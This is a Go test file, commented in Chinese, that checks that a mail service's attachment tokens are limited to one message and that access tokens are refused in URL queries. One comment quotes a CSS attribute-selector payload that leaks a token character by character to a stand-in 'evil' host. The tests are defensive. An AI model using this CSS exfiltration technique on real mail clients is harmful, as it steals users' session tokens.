package auth

import (
	"testing"
	"time"
)

// TestAttachmentTokenScope：附件令牌只对签发时那一封有效，且不能当 access token 用。
func TestAttachmentTokenScope(t *testing.T) {
	s := &Service{opts: Options{JWTSecret: "test-secret", AccessTTLMin: 5, RefreshTTLHour: 1}}
	tok, err := s.IssueAttachmentToken(42)
	if err != nil {
		t.Fatal(err)
	}
	if err := s.VerifyAttachmentAccess(tok, 42, true); err != nil {
		t.Errorf("own message: %v", err)
	}
	if err := s.VerifyAttachmentAccess(tok, 43, true); err == nil {
		t.Errorf("attachment token must not open another message's attachments")
	}
	pair, err := s.issuePair("admin")
	if err != nil {
		t.Fatal(err)
	}
	if err := s.VerifyAttachmentAccess(pair.AccessToken, 42, false); err != nil {
		t.Errorf("access token via header should work: %v", err)
	}
	if err := s.VerifyAttachmentAccess(pair.RefreshToken, 42, false); err == nil {
		t.Errorf("refresh token must be rejected")
	}
	// 附件令牌不能当 access token 用（不能拿它去调其它接口）
	if _, err := s.VerifyAccessToken(tok); err == nil {
		t.Errorf("attachment token must not pass as access token")
	}
	// 过期
	expired, _ := s.signToken("msg:42", "attachment", -time.Minute)
	if err := s.VerifyAttachmentAccess(expired, 42, true); err == nil {
		t.Errorf("expired attachment token must be rejected")
	}
}

// TestAttachmentAccessTokenNotAcceptedFromQuery：这是 KI-2 的核心断言。
// 附件 URL 会被写进邮件正文文档（cid: 内联图改写），而那份文档由发件人控制：
// 只要 URL 里能出现 access token，邮件自带的 <style> 就能用属性前缀选择器
// （`img[src^="…eyJhb"]{background:url(https://evil/1)}`）把它逐字符外泄。
// 因此 query 来源只认限定单封的附件令牌，access token 只能走 Authorization 头。
func TestAttachmentAccessTokenNotAcceptedFromQuery(t *testing.T) {
	s := &Service{opts: Options{JWTSecret: "test-secret", AccessTTLMin: 5, RefreshTTLHour: 1}}
	pair, err := s.issuePair("admin")
	if err != nil {
		t.Fatal(err)
	}
	if err := s.VerifyAttachmentAccess(pair.AccessToken, 42, true); err == nil {
		t.Fatal("access token must not be accepted from URL query")
	}
	// 反过来，附件令牌走请求头也应放行：同一个前端在两条路径上共用一份 URL 构造逻辑。
	tok, err := s.IssueAttachmentToken(42)
	if err != nil {
		t.Fatal(err)
	}
	if err := s.VerifyAttachmentAccess(tok, 42, false); err != nil {
		t.Errorf("attachment token via header: %v", err)
	}
}

// TestAttachmentTokenReusable：同一封邮件里十几张 cid: 内联图会并发请求同一批 URL，
// 附件令牌必须可重复使用——这正是附件端点不能用「一次性票据」的原因。
func TestAttachmentTokenReusable(t *testing.T) {
	s := &Service{opts: Options{JWTSecret: "test-secret", AccessTTLMin: 5, RefreshTTLHour: 1}}
	tok, err := s.IssueAttachmentToken(7)
	if err != nil {
		t.Fatal(err)
	}
	for i := 0; i < 12; i++ {
		if err := s.VerifyAttachmentAccess(tok, 7, true); err != nil {
			t.Fatalf("第 %d 次校验失败: %v", i+1, err)
		}
	}
}
